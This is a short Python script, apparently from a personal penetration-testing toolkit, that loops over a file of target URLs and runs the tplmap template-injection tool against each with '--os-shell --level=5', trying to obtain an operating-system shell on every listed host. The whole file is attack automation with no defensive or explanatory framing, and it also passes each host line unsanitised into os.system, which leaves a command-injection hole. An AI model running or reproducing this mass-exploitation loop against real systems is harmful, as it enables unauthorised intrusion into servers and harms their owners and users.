#!/usr/bin/env python
import os

read_file = open('/root/pwn/toolk1t/3_Content-Discovery/tplmap/fuzzables.txt','r')
for host in read_file:
	os.system("python2 /root/pwn/toolk1t/3_Content-Discovery/tplmap/tplmap.py -u " + host.rstrip() + " --os-shell --level=5")
read_file.close()
